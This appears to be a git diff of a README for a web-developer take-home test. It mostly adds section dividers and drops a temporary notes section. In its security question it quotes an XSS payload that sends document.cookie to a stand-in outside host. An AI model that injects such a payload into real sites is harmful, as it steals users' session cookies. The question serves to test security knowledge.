@@ -18,6 +18,8 @@ Contact : sunnysidesounds@gmail.com / 415-690-3590
     * Run tests by `yarn react-scripts test`
     * Location: `src/questions1/Integer.test.js` (unit tests)
 
+---
+
 ## Question 2: Implementation of _clockwiseMatrix(matrixString)_
 
 * Assumptions:
@@ -46,6 +48,7 @@ Contact : sunnysidesounds@gmail.com / 415-690-3590
         * Matrix string to 2d-array formatting
         * Matrix generation
 
+---
 
 ## Question 3: Simple Account Mangement Service
 
@@ -128,11 +131,14 @@ I’ve completed 3 out of the 4 enhancements.
 
 <img width="776" alt="Screen Shot 2020-10-12 at 9 34 41 PM" src="https://user-images.githubusercontent.com/1030838/95816139-37478980-0cd3-11eb-8ae4-cc8285f85146.png">
 
+---
 
 ## Question 4:
 * Question: What harm could result from the following? `http://www.example.com/search?q=<script>object.src="http://otherexample.com/code?data="+document.cookie</script>`
 * Answer: This could be vulnerable to HTTP parameter pollution if the parameters aren’t being sanitized properly. This also looks like it would be vulnerable to cross-side
 scripting XSS attacking. Where the attacker could manipulate cookie data.
+
+---
 
 ## Question 5:
 * Question: Explain what security measures need to be taken into consideration for web applications.
@@ -143,36 +149,10 @@ scripting XSS attacking. Where the attacker could manipulate cookie data.
     * Strong validation on the source input on client as well as server-side. (When applicable)
     * Implement a strong password process / policy (e.g letters, numbers, symbols)
 
+---
+
 ## Question 6:
 * Question: Please provide us with a link(s) to your portfolio and/or some code samples of your work.
 * Answer:
 
-
-
-## Things I had to change due to errors: (TEMP)
-
-
-* Package.json updates:
-
-- Update to "node-sass": "^4.14.1", because I was using node v14.13.0 ( was v14.11.0
-- Had to add "fsevents": "^2.1.3", because `yarn react-scripts test` wouldn't run
-
-
-
-* Fixed errors I came across doing question 1:
-
-
-[Error: Invariant failed: You should not use <Switch> outside a <Router>]
-
-/*
- * Warning: Failed prop type: You provided a value prop to a form
- * field without an onChange handler. This will render a read-only
- * field. If the field should be mutable use defaultValue.
- * Otherwise, set either onChange or readOnly.
- *  */
-
-
-
- ### Questions
- - What are using using bind function or arrow functions?
- - Write a script about environment variables.
+---
